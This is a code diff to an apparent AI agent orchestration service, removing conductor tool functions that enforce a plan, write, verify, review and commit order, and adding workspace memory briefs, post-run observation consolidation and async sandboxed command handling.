-            steps = self.goals.steps(goal_id)
-            return json.dumps({
-                "status": refreshed.status,
-                "steps": [
-                    {"step_id": s.id, "title": s.title, "order": s.ordinal}
-                    for s in steps
-                ],
-                "note": (
-                    "The plan is waiting for the user to approve it. Nothing has "
-                    "been written and nothing can be until they start it. Tell "
-                    "them what the steps are and stop."
-                ),
-            }, default=str)
-
-        async def write(args: dict[str, Any]) -> str:
-            step_id = str(args.get("step_id") or "").strip()
-            instructions = str(args.get("instructions") or "").strip()
-            step = step_for(step_id)
-            if isinstance(step, str):
-                return step
-            allowed, why = self._write_allowed(goal_id)
-            if not allowed:
-                return why
-            if not instructions:
-                return "write needs instructions: what should change."
-            fs = FileSystemService(ws.root_path)
-            try:
-                async with self._stage(goal_id, "fixer", "fixer", step.id) as fix_stage:
-                    summaries, _wants_pass = await self._fixer(
-                        goal_id, step, fs, goal.dry_run, self._evidence_for(goal_id),
-                        guidance=instructions,
-                    )
-                    changed = [s for s in summaries if s.get("changed", True)]
-                    fix_stage.record("wrote" if changed else "no_change")
-            except (AgentOutputInvalid, ProviderError, PathEscapeError) as exc:
-                return (
-                    f"The fixer failed on that step ({getattr(exc, 'code', 'error')}: "
-                    f"{exc}). Nothing further was written for it."
-                )
-            state.setdefault(step.id, {})["files"] = summaries
-            return json.dumps({
-                "step_id": step.id,
-                "changed": [
-                    {"path": s.get("path"), "op": s.get("op", "write")}
-                    for s in summaries if s.get("changed", True)
-                ],
-                "dry_run": bool(goal.dry_run),
-                "note": (
-                    "This was a dry run: the files were proposed, not written. "
-                    if goal.dry_run else
-                    "Call `verify` next: a change that has not been run is one "
-                    "nobody has seen work."
-                ),
-            }, default=str)
-
-        async def verify(args: dict[str, Any]) -> str:
-            step_id = str(args.get("step_id") or "").strip()
-            step = step_for(step_id)
-            if isinstance(step, str):
-                return step
-            summaries = state.get(step.id, {}).get("files")
-            if summaries is None:
-                return (
-                    "Nothing has been written for that step in this run. Call "
-                    "`write` first — verification is meant to judge a change, "
-                    "and there is none."
-                )
-            try:
-                async with self._stage(goal_id, "verifier", "verifier", step.id) as v:
-                    outcome = await self._verifier(
-                        goal_id, step, ws, self._evidence_for(goal_id), diffs=summaries,
-                    )
-                    v.record(_verifier_outcome(outcome))
-            except TestsFailed as exc:
-                # The verifier's own contract: a failed run is the verdict, and
-                # it raises it as control flow inside `run_step`. Here it is a
-                # value, because the conductor is the thing that decides what to
-                # do about a failure — retry, re-plan, or report it.
-                outcome = self._last_test_result(goal_id, step.id)
-                state.setdefault(step.id, {})["test"] = outcome
-                return "Verification FAILED. " + json.dumps({
-                    "reason": str(exc), "outcome": outcome,
-                }, default=str)
-            except (AgentOutputInvalid, ProviderError) as exc:
-                return (
-                    f"The verifier could not run ({getattr(exc, 'code', 'error')}: "
-                    f"{exc}). This step is unverified."
-                )
-            state.setdefault(step.id, {})["test"] = outcome
-            return json.dumps({"passed": True, "outcome": outcome}, default=str)
-
-        async def review(args: dict[str, Any]) -> str:
-            step_id = str(args.get("step_id") or "").strip()
-            step = step_for(step_id)
-            if isinstance(step, str):
-                return step
-            summaries = state.get(step.id, {}).get("files")
-            if summaries is None:
-                return (
-                    "There is nothing to review for that step: it has not been "
-                    "written in this run. Call `write` first."
-                )
-            outcome = state.get(step.id, {}).get("test") or self._last_test_result(
-                goal_id, step.id
-            )
-            if not outcome:
-                return (
-                    "That step has no test verdict yet, and a review without one "
-                    "cannot tell working code from broken code. Call `verify` first."
-                )
-            fs = FileSystemService(ws.root_path)
-            try:
-                async with self._stage(goal_id, "critic", "critic", step.id) as c:
-                    await self._critic(
-                        goal_id, step, fs, summaries, self._evidence_for(goal_id),
-                        outcome, ws_root=ws.root_path,
-                    )
-                    c.record("approve")
-            except CriticRejection as exc:
-                # Recorded here because the stage block above never reaches its
-                # `record` on this path, and a critic that asked for changes is
-                # the one outcome a reader most needs to see.
-                self.goals.publish(self._event(
-                    goal_id, step.id, "stage_result",
-                    {
-                        "stage": "critic", "role": "critic", "ordinal": 0,
-                        "outcome": "request_changes", "detail": str(exc),
-                        "duration_ms": 0, "tokens": 0, "calls": 0,
-                    },
-                ))
-                return (
-                    "The critic asked for changes and did not approve: " + str(exc)
-                    + "\nEither act on those reasons with `write`, or tell the user "
-                    "plainly that you are not going to and why."
-                )
-            state.setdefault(step.id, {})["reviewed"] = True
-            return "The critic approved this step. Call `summarize` to record and commit it."
-
-        async def summarize(args: dict[str, Any]) -> str:
-            step_id = str(args.get("step_id") or "").strip()
-            step = step_for(step_id)
-            if isinstance(step, str):
-                return step
-            summaries = state.get(step.id, {}).get("files")
-            if summaries is None:
-                return "That step was not written in this run, so there is nothing to record."
-            if not state.get(step.id, {}).get("reviewed"):
-                # Not a formality. The commit is the point of no return for a
-                # step, and the review is the only thing standing between a
-                # model's opinion of its own work and the user's git history.
-                return (
-                    "That step has not been reviewed. Call `review` first, and "
-                    "commit it only if the critic approved."
-                )
-            outcome = state.get(step.id, {}).get("test") or self._last_test_result(
-                goal_id, step.id
-            )
-            try:
-                async with self._stage(goal_id, "scribe", "scribe", step.id) as s:
-                    s.record(
-                        await self._scribe(
-                            goal_id, step, summaries, ws.root_path, goal.dry_run, outcome,
-                        )
-                    )
-            except (AgentOutputInvalid, ProviderError) as exc:
-                return f"The scribe could not record that step ({exc})."
-            self._set_step(goal_id, step, "COMPLETED")
-            return "That step is recorded and committed."
-
-        return {
-            "read_file": read_file,
-            "search_code": search_code,
-            "git_history": git_history,
-            "run_command": run_command,
-            "recon": recon,
-            "design": design,
-            "plan": plan,
-            "write": write,
-            "verify": verify,
-            "review": review,
-            "summarize": summarize,
-            "use_skill": use_skill,
-        }
 
     def _settings_int(self, key: str, default: int) -> int:
         """One engine setting, or the default.
@@ -2182,6 +2490,40 @@ class ExecutorService:
                 + "; ".join(s.title for s in remaining),
             )
 
+    def _memory_brief(self, goal: Goal) -> str:
+        """This workspace's history, put in front of the conductor unprompted.
+
+        The injection half of the memory model (docs/10 §6): the tools exist,
+        and a model that does not know to ask never benefits from them. The
+        brief carries the two grains — earlier threads, and what this
+        workspace's own outcomes have taught — composed by
+        `recall.build_brief` from the same reads the tools serve, so it cannot
+        disagree with what `recall` or `recall_threads` would answer.
+
+        Empty when there is nothing to say, so a first-ever turn gains no
+        section at all. Logged so the transcript shows what the turn was told.
+        """
+        try:
+            brief = build_brief(
+                self.goals.thread_recall(goal.workspace_id),
+                self.goals.recall_events(goal.workspace_id),
+                observation_rows=self.goals.observation_rows(goal.workspace_id),
+                current_thread_id=goal.conversation_id,
+            )
+        except Exception as exc:  # noqa: BLE001 — a brief is an upgrade, never a prerequisite
+            # A brief that cannot be computed must not fail the turn, and the
+            # warn needs a goal to attach to — which this goal is.
+            self._log(
+                goal.id, None, "warn", f"memory brief unavailable: {exc}",
+            )
+            return ""
+        if brief:
+            self._log(
+                goal.id, None, "info",
+                f"conductor briefed with workspace memory ({len(brief)} chars)",
+            )
+        return brief
+
     def _intent_brief(self, intent: str) -> str:
         """What the gate decided, told to the conductor, and what to do with it.
 
@@ -2250,7 +2592,7 @@ class ExecutorService:
             if goal.conversation_id else []
         )
         prompt = prompt_override if prompt_override is not None else self._turn_prompt(goal)
-        prompt = f"{prompt}\n\n{self._intent_brief(intent)}"
+        prompt = f"{prompt}\n\n{self._memory_brief(goal)}\n\n{self._intent_brief(intent)}"
         # A change request arrives with a reminder armed, because a small model
         # asked to plan will sometimes describe the plan and stop instead of
         # making it. Nothing is armed for a question: answering *is* the action
@@ -2283,6 +2625,8 @@ class ExecutorService:
             ),
             fallback=(fallback[0], fallback[1]) if fallback is not None else None,
             on_fallback=self._conductor_fallback_notice(goal_id, role, targets),
+            num_ctx=cfg.ollama_num_ctx,
+            keep_alive=cfg.ollama_keep_alive,
         )
         # Announced before the first call, so a run that spends its whole budget
         # is still legible as "the conductor looked at things" rather than a
@@ -2520,7 +2864,9 @@ class ExecutorService:
                 latest = ev.payload or {}
         return latest
 
-    async def _librarian(self, goal_id: str, goal: Goal, ws: Any) -> dict[str, Any]:
+    async def _librarian(
+        self, goal_id: str, goal: Goal, ws: Any, task: str = "",
+    ) -> dict[str, Any]:
         """Look around before anything is planned or changed.
 
         Rounds: the librarian asks for material (reads, searches, read-only git or
@@ -2530,6 +2876,15 @@ class ExecutorService:
 
         Everything it claims is checked against what it was actually shown: a file
         it never opened is dropped and logged rather than passed on as fact.
+
+        `task` is what the conductor said it wanted found out, and it exists for
+        the same reason `_fixer`'s `guidance` does: the conductor is the one
+        dispatching this run, so a "look around the workspace" that ignored what
+        it was sent to look for was not doing its job. It is placed *beside* the
+        goal and labelled as an addition, never in place of it — the goal is what
+        the user asked for, and a conductor that could rewrite it could send the
+        librarian after something the user never requested. Empty (the engine's
+        own path, with no conductor) leaves the prompt byte-identical to before.
         """
         lib = LibraryService(ws.root_path)
         tree = lib.tree()
@@ -2551,8 +2906,18 @@ class ExecutorService:
                 "told the librarian to distrust them rather than to follow them",
             )
         prior = format_knowledge(knowledge)
+        # The conductor's ask, beside the goal rather than instead of it, and
+        # ahead of the tree so it is read as an instruction about the material
+        # that follows rather than as another thing to look at.
+        ask_section = ""
+        if task.strip():
+            ask_section = (
+                "The conductor asked for this specifically, in addition to the "
+                f"goal above:\n{task.strip()}\n\n"
+            )
         prompt = (
                 f"Goal: {goal.title}\nDescription:\n{goal.description}\n\n"
+                f"{ask_section}"
                 f"Workspace tree (depth 2, {len(tree['files'])} entries"
                 f"{', TRUNCATED' if tree['truncated'] else ''}):\n{listing}\n\n"
                 f"{prior}"
@@ -2580,7 +2945,7 @@ class ExecutorService:
                 # different outcomes.
                 capped = True
                 break
-            text, opened_now, matched_now, refused = self._serve_library_requests(goal_id, lib, requests)
+            text, opened_now, matched_now, refused = await self._serve_library_requests(goal_id, lib, requests)
             opened |= opened_now
             matched |= matched_now
             if refused:
@@ -2651,7 +3016,7 @@ class ExecutorService:
                     requests.append((kind, item))
         return requests
 
-    def _serve_library_requests(
+    async def _serve_library_requests(
         self, goal_id: str, lib: LibraryService, requests: list[tuple[str, Any]],
     ) -> tuple[str, set[str], set[str], int]:
         """Fetch what the librarian asked for, within one round's budget.
@@ -2659,6 +3024,12 @@ class ExecutorService:
         A refusal is information, never a failure: an escape attempt, a forbidden
         command, or a file that is not there is reported back so the librarian can
         ask for something else instead of the goal dying over it.
+
+        Async because three of the four kinds are slow off the CPU: `git` and
+        `run` start a **process** through the sandbox, and a search walks the
+        tree. Run in the event loop, one twenty-second command held every
+        WebSocket tick, every `/health` probe and every cancel request behind it
+        — the app spent the command's whole duration reporting itself offline.
         """
         chunks: list[str] = []
         opened: set[str] = set()
@@ -2687,16 +3058,20 @@ class ExecutorService:
                     text = format_read(res)
                 elif kind == "searches" and isinstance(item, dict):
                     # Structured search: {query, regex, glob}.
-                    res = lib.search(item["query"], glob=item.get("glob"), regex=bool(item.get("regex")))
+                    res = await asyncio.to_thread(
+                        lib.search, item["query"],
+                        glob=item.get("glob"), regex=bool(item.get("regex")),
+                    )
                     matched.update(m["path"] for m in res["matches"])
                     text = format_search(res)
                 elif kind == "searches":
-                    res = lib.search(label)
+                    res = await asyncio.to_thread(lib.search, label)
                     matched.update(m["path"] for m in res["matches"])
                     text = format_search(res)
                 else:
                     args = [str(a) for a in item] if isinstance(item, list) else [str(item)]
-                    res = lib.git(args) if kind == "git" else lib.run(args)
+                    run = lib.git if kind == "git" else lib.run
+                    res = await asyncio.to_thread(run, args)
                     text = format_command(res)
             except (PathEscapeError, CommandNotAllowed) as exc:
                 refused += 1
@@ -2945,6 +3320,7 @@ class ExecutorService:
 
     async def _design(
         self, goal_id: str, goal: Goal, ws: Any, evidence: dict[str, Any],
+        task: str = "",
     ) -> dict[str, Any]:
         """Lock the direction this goal is built against, and publish it.
 
@@ -2952,9 +3328,14 @@ class ExecutorService:
         handed over whole and framed as binding, and a reply cannot relabel
         where it came from. `applies: false` — or a reply naming no direction —
         is an answer, not a failure, and publishes nothing.
+
+        `task` is the conductor's ask, on the same terms as `_librarian`'s: it
+        narrows what the designer decides about, beside the goal, and it is
+        placed *before* the contract block so the workspace's own binding brand
+        is still the last thing in the prompt and still wins.
         """
         brand = self._brand_contract(goal_id, ws)
-        prompt = self._design_prompt(goal, evidence, brand, deliverable=False)
+        prompt = self._design_prompt(goal, evidence, brand, deliverable=False, task=task)
         out = await self.orchestrator.run_agent("design", goal_id, None, prompt)
         contract = self._design_contract(out, brand)
         if not contract:
@@ -3104,7 +3485,7 @@ class ExecutorService:
 
     def _design_prompt(
         self, goal: Goal, evidence: dict[str, Any], brand: dict[str, Any] | None,
-        *, deliverable: bool,
+        *, deliverable: bool, task: str = "",
     ) -> str:
         """The design call's prompt: the goal, what is known, and the contract.
 
@@ -3112,11 +3493,20 @@ class ExecutorService:
         file. A normal goal is *bound* by a contract the workspace already has;
         a design goal is writing it, so the same text is revision material and
         must not be mistaken for a law to obey.
+
+        `task` is optional and last-of-the-instructions: everything the workspace
+        has to say about the contract follows it, so a conductor's ask can shape
+        what is decided without ever outranking the contract.
         """
         parts = [
             f"Goal: {goal.title}\nDescription:\n{goal.description}",
             f"What the librarian found:\n{self._evidence_text(evidence)}",
         ]
+        if task.strip():
+            parts.append(
+                "The conductor asked for this specifically, in addition to the "
+                f"goal above:\n{task.strip()}"
+            )
         if deliverable:
             parts += [
                 DESIGN_BRIEF_PROMPT,
@@ -4766,6 +5156,34 @@ class ExecutorService:
         # update_status publishes the goal_status event itself.
         current = self.goals.get(goal_id)
         self.goals.update_status(goal_id, current.version, status, step_id)
+        if status in ("COMPLETED", "FAILED", "CANCELLED"):
+            # Terminal, whichever way it went: this run just taught the
+            # workspace something, and the store is refined now rather than
+            # discovered stale by the next turn's brief. Best-effort — a
+            # consolidation failure must never turn a finished run into a
+            # failed one, and the log line is the only trace it leaves.
+            try:
+                self._consolidate(goal_id)
+            except Exception as exc:  # noqa: BLE001 — memory is never load-bearing
+                self._log(
+                    goal_id, None, "warn",
+                    f"observation consolidation failed: {exc}",
+                )
+
+    def _consolidate(self, goal_id: str) -> int:
+        """Distill this run's outcomes into the durable observation store.
+
+        The write half of docs/10 §6's reflect: the *engine* refines the store
+        after each run — never a model mid-turn — because memory is what a
+        future turn trusts, and a future turn's trust is not something a
+        conductor reply gets to write. The rows come from `recall_events` (the
+        same allow-listed scan the tools read) with ids, so every observation
+        carries its supporting event ids.
+        """
+        goal = self.goals.get(goal_id)
+        rows = self.goals.recall_events(goal.workspace_id, with_ids=True)
+        observations = distill_observations(rows)
+        return self.goals.record_observations(goal.workspace_id, observations)
 
     def _fail(
         self,
